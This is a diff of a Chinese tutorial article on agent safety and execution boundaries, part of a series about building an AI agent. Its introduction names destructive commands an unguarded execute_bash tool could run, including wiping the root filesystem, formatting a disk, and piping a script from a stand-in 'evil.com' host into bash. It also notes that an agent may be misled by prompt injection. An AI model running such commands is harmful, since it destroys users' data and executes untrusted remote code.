@@ -3,29 +3,28 @@
 > **「从零开始理解 Agent」系列** —— 以 `nanoagent` 这组小而完整的 Python 示例为主线，逐层拆解 Agent 的核心结构。
 >
 > - [第一篇：最小闭环与工具调用](../01-essence/agent-essence.md) —— 工具 + 循环
-> - [第二篇：记忆与规划](../02-memory/agent-memory.md) —— 206 行
-> - [第三篇：Rules、Skills 与 MCP](../03-skills-mcp/agent-skills-mcp.md) —— 282 行
-> - [第四篇：SubAgent 子智能体](../04-subagent/agent-subagent.md) —— 192 行
-> - [第五篇：多智能体协作与编排](../05-teams/agent-teams.md) —— 270 行
-> - [第六篇：上下文压缩](../06-compact/agent-compact.md) —— 169 行
-> - **第七篇：安全与权限控制**（本文）—— 219 行
+> - [第二篇：记忆、规划与多步执行](../02-memory/agent-memory.md) —— 206 行
+> - [第三篇：Rules、Skills、MCP 与可配置能力](../03-skills-mcp/agent-skills-mcp.md) —— 282 行
+> - [第四篇：SubAgent 与独立上下文委派](../04-subagent/agent-subagent.md) —— 192 行
+> - [第五篇：持久智能体与团队协作](../05-teams/agent-teams.md) —— 270 行
+> - [第六篇：上下文压缩与长任务续航](../06-compact/agent-compact.md) —— 169 行
+> - **第七篇：执行边界、安全确认与 Hook 化**（本文）—— 219 行
 
-前六篇我们一直在给 Agent 加能力。但有一个危险我们一直视而不见：**Agent 手里有一把没有保险的枪。**
+前六篇一直在给 Agent 加能力，但有一个风险始终没有被正面收束：**Agent 已经能执行动作，却还没有稳定的刹车机制。**
 
-回忆第一篇中的 `execute_bash` 工具——它可以执行任意 shell 命令。任意。包括 `rm -rf /`、`mkfs.ext4 /dev/sda`、`curl http://evil.com | bash`。LLM 不是完美的，它有可能因为理解错误、幻觉、或者 prompt 注入而执行危险操作。
+回忆第一篇中的 `execute_bash` 工具，它可以执行任意 shell 命令。任意。包括 `rm -rf /`、`mkfs.ext4 /dev/sda`、`curl http://evil.com | bash`。LLM 不是完美的，它可能因为理解错误、幻觉，或者 prompt 注入而执行危险操作。
 
 这不是理论风险。只要你让 Agent 干过真正的活，一定遇到过它试图做一些你没预料到的事情。
 
-今天我们回到 agent-essence.py 的基础上，加上三道安全防线，让 Agent 从“能执行”推进到“受约束地执行”。
+这一篇回到 `agent-essence.py` 的基础上，加上三道安全防线，让 Agent 从“能执行”推进到“受约束地执行”。
 
 ## 本文聚焦
 
 - 对应脚本：[agent-safe.py](./agent-safe.py)
 - 当前仓库中的脚本行数：`219`
-- 这篇会回答三件事：
-- 为什么 Agent 安全问题首先是执行边界问题，而不是模型“聪不聪明”的问题
-- 三道防线分别在拦什么风险
-- 为什么 Hook 化是从教学样例走向工程化的自然下一步
+- 核心问题 1：为什么 Agent 安全问题首先是执行边界问题，而不是模型“聪不聪明”的问题
+- 核心问题 2：三道防线分别在拦什么风险
+- 核心问题 3：为什么 Hook 化是从教学样例走向工程化的自然下一步
 
 ---
 
